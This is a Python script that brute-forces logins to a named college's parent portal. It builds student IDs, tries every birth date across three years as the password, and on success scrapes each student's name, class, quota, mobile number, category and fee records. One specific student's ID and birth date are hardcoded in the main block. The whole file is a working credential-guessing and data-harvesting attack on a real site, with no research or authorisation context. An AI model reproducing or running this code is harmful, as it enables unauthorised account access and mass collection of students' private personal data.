from scraper import Scraper

D_URL = "https://parents.msrit.edu/"
T_URL = f"{D_URL}"
HEAD = "1MS"
YEAR = "21"
DEPT = "IS"


def get_payload():
    return {
        "username": "",
        "dd": "",
        "mm": "",
        "yyyy": "",
        "passwd": "",
        "remember": "",
        "option": "com_user",
        "task": "login",
        "return": "",
        "ea07d18ec2752bcca07e20a852d96337": "1"
    }


def set_payload(payload, usn, dd, mm, yyyy):
    payload["username"] = usn.lower()
    payload["passwd"] = f"{yyyy:04}-{mm:02}-{dd:02}"


def get_stats(payload):
    soup = S.get_soap(T_URL, "POST", payload)
    body = soup.body
    try:
        td = body.find_all("td")
        trs = body.find_all("tbody")[1].find_all("tr")
        return {
            "name": body.find_all("h3")[0].text,
            "usn": payload["username"],
            "dob": payload["passwd"],
            "class": body.find_all("p")[6].text.strip(),
            "quota": td[4].text[7:],
            "mob": td[5].text[8:],
            "cat": td[8].text[18:],
            "paid": [tr.find_all("td")[3].text for tr in trs]
        }
    except IndexError:
        return
    except ValueError:
        return


def brute_loop(payload, i):
    Year = int(f"20{YEAR}")
    for year in [Year-18, Year-19, Year-17]:
        for month in range(1, 13):
            for day in range(1, 32):
                set_payload(payload, f"{HEAD}{YEAR}{DEPT}{i:03}", day, month, year)
                print("[LOG] Try:", payload["passwd"])
                stats = get_stats(payload)
                if stats: return stats


if __name__ == '__main__':
    with Scraper() as S:
        pl = get_payload()
        set_payload(pl, "1ms21is017", 7, 6, 2003)
        st = get_stats(pl)
        print(st)
